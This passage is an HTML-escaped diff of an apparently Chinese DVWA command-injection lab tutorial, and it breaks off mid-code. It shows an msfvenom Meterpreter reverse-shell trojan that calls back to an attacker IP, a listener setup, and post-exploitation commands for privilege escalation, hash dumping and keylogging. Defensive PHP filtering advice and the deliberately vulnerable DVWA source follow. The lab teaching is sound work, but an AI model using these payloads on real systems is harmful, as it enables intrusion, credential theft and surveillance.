+&lt;h4 id=&#34;2-功能演示&#34;&gt;&lt;a href=&#34;#2-功能演示&#34; class=&#34;headerlink&#34; title=&#34;2. 功能演示&#34;&gt;&lt;/a&gt;2. 功能演示&lt;/h4&gt;&lt;p&gt;通过蚁剑可以实现：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;文件管理：浏览、上传、下载、编辑文件&lt;/li&gt;
+&lt;li&gt;数据库管理：连接和操作数据库&lt;/li&gt;
+&lt;li&gt;虚拟终端：执行系统命令&lt;/li&gt;
+&lt;li&gt;反向代理：建立隧道连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;方法三：MSF提权操作&#34;&gt;&lt;a href=&#34;#方法三：MSF提权操作&#34; class=&#34;headerlink&#34; title=&#34;方法三：MSF提权操作&#34;&gt;&lt;/a&gt;方法三：MSF提权操作&lt;/h3&gt;&lt;h4 id=&#34;1-生成Meterpreter木马&#34;&gt;&lt;a href=&#34;#1-生成Meterpreter木马&#34; class=&#34;headerlink&#34; title=&#34;1. 生成Meterpreter木马&#34;&gt;&lt;/a&gt;1. 生成Meterpreter木马&lt;/h4&gt;&lt;p&gt;在Kali Linux中执行：&lt;/p&gt;
+&lt;figure class=&#34;highlight zsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs zsh&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -f exe &amp;gt; shell.exe&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;参数说明：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;: 指定Payload类型&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LHOST&lt;/code&gt;: 攻击者IP地址&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LPORT&lt;/code&gt;: 监听端口&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-f&lt;/code&gt;: 输出格式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;2-上传木马文件&#34;&gt;&lt;a href=&#34;#2-上传木马文件&#34; class=&#34;headerlink&#34; title=&#34;2. 上传木马文件&#34;&gt;&lt;/a&gt;2. 上传木马文件&lt;/h4&gt;&lt;p&gt;通过蚁剑将生成的&lt;code&gt;shell.exe&lt;/code&gt;上传到目标服务器：&lt;/p&gt;
+&lt;figure class=&#34;highlight basic&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs basic&#34;&gt;C:\Users\Public\&lt;span class=&#34;hljs-keyword&#34;&gt;shell&lt;/span&gt;.exe&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;3-配置MSF监听器&#34;&gt;&lt;a href=&#34;#3-配置MSF监听器&#34; class=&#34;headerlink&#34; title=&#34;3. 配置MSF监听器&#34;&gt;&lt;/a&gt;3. 配置MSF监听器&lt;/h4&gt;&lt;p&gt;启动Metasploit：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;msfconsole&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;配置监听器：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;use exploit/multi/handler&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; lhost 192.168.147.129&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; lport 4444&lt;br&gt;exploit&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;4-执行木马获取Meterpreter会话&#34;&gt;&lt;a href=&#34;#4-执行木马获取Meterpreter会话&#34; class=&#34;headerlink&#34; title=&#34;4. 执行木马获取Meterpreter会话&#34;&gt;&lt;/a&gt;4. 执行木马获取Meterpreter会话&lt;/h4&gt;&lt;p&gt;在蚁剑终端或通过命令注入执行：&lt;/p&gt;
+&lt;figure class=&#34;highlight vbnet&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vbnet&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;C:&lt;/span&gt;\Users\&lt;span class=&#34;hljs-keyword&#34;&gt;Public&lt;/span&gt;\shell.exe&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;成功建立连接后，可以使用Meterpreter的强大功能：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs shell&#34;&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取系统信息&lt;/span&gt;&lt;br&gt;sysinfo&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取用户权限&lt;/span&gt;&lt;br&gt;getuid&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;提权到SYSTEM&lt;/span&gt;&lt;br&gt;getsystem&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取密码哈希&lt;/span&gt;&lt;br&gt;hashdump&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;截屏&lt;/span&gt;&lt;br&gt;screenshot&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;键盘记录&lt;/span&gt;&lt;br&gt;keyscan_start&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h2 id=&#34;🛡️-防护措施&#34;&gt;&lt;a href=&#34;#🛡️-防护措施&#34; class=&#34;headerlink&#34; title=&#34;🛡️ 防护措施&#34;&gt;&lt;/a&gt;🛡️ 防护措施&lt;/h2&gt;&lt;h3 id=&#34;输入验证和过滤&#34;&gt;&lt;a href=&#34;#输入验证和过滤&#34; class=&#34;headerlink&#34; title=&#34;输入验证和过滤&#34;&gt;&lt;/a&gt;输入验证和过滤&lt;/h3&gt;&lt;h4 id=&#34;1-白名单验证&#34;&gt;&lt;a href=&#34;#1-白名单验证&#34; class=&#34;headerlink&#34; title=&#34;1. 白名单验证&#34;&gt;&lt;/a&gt;1. 白名单验证&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;validateIP&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// 使用白名单验证IP地址格式&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;filter_var&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;, FILTER_VALIDATE_IP)) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$validIP&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;validateIP&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$validIP&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;escapeshellarg&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$validIP&lt;/span&gt;));&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Invalid IP address&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;2-特殊字符过滤&#34;&gt;&lt;a href=&#34;#2-特殊字符过滤&#34; class=&#34;headerlink&#34; title=&#34;2. 特殊字符过滤&#34;&gt;&lt;/a&gt;2. 特殊字符过滤&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;filterDangerousChars&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$input&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// 过滤危险字符&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$dangerous&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;amp;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;`&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;$&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;(&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;)&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#123;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#125;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;[&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;]&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$dangerous&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$input&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;使用安全的API&#34;&gt;&lt;a href=&#34;#使用安全的API&#34; class=&#34;headerlink&#34; title=&#34;使用安全的API&#34;&gt;&lt;/a&gt;使用安全的API&lt;/h3&gt;&lt;h4 id=&#34;避免直接调用系统命令&#34;&gt;&lt;a href=&#34;#避免直接调用系统命令&#34; class=&#34;headerlink&#34; title=&#34;避免直接调用系统命令&#34;&gt;&lt;/a&gt;避免直接调用系统命令&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 不安全的方式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 安全的方式：使用专门的函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;securePing&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;filter_var&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;, FILTER_VALIDATE_IP)) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 使用socket或其他安全方式实现ping功能&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 而不是直接调用系统命令&lt;/span&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;权限控制&#34;&gt;&lt;a href=&#34;#权限控制&#34; class=&#34;headerlink&#34; title=&#34;权限控制&#34;&gt;&lt;/a&gt;权限控制&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;：Web应用程序应该以最小权限用户运行&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;禁用危险函数&lt;/strong&gt;：在php.ini中禁用&lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;shell_exec&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt;等函数&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;沙箱环境&lt;/strong&gt;：将Web应用程序运行在受限的环境中&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;代码审计&#34;&gt;&lt;a href=&#34;#代码审计&#34; class=&#34;headerlink&#34; title=&#34;代码审计&#34;&gt;&lt;/a&gt;代码审计&lt;/h3&gt;&lt;p&gt;定期进行代码安全审计，重点关注：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户输入处理&lt;/li&gt;
+&lt;li&gt;系统命令调用&lt;/li&gt;
+&lt;li&gt;文件操作&lt;/li&gt;
+&lt;li&gt;数据库查询&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;📊-安全等级分析&#34;&gt;&lt;a href=&#34;#📊-安全等级分析&#34; class=&#34;headerlink&#34; title=&#34;📊 安全等级分析&#34;&gt;&lt;/a&gt;📊 安全等级分析&lt;/h2&gt;&lt;h3 id=&#34;DVWA各安全等级的防护机制&#34;&gt;&lt;a href=&#34;#DVWA各安全等级的防护机制&#34; class=&#34;headerlink&#34; title=&#34;DVWA各安全等级的防护机制&#34;&gt;&lt;/a&gt;DVWA各安全等级的防护机制&lt;/h3&gt;&lt;h4 id=&#34;Low级别&#34;&gt;&lt;a href=&#34;#Low级别&#34; class=&#34;headerlink&#34; title=&#34;Low级别&#34;&gt;&lt;/a&gt;Low级别&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 完全没有过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;Medium级别&#34;&gt;&lt;a href=&#34;#Medium级别&#34; class=&#34;headerlink&#34; title=&#34;Medium级别&#34;&gt;&lt;/a&gt;Medium级别&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 简单的黑名单过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;amp;&amp;amp;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span 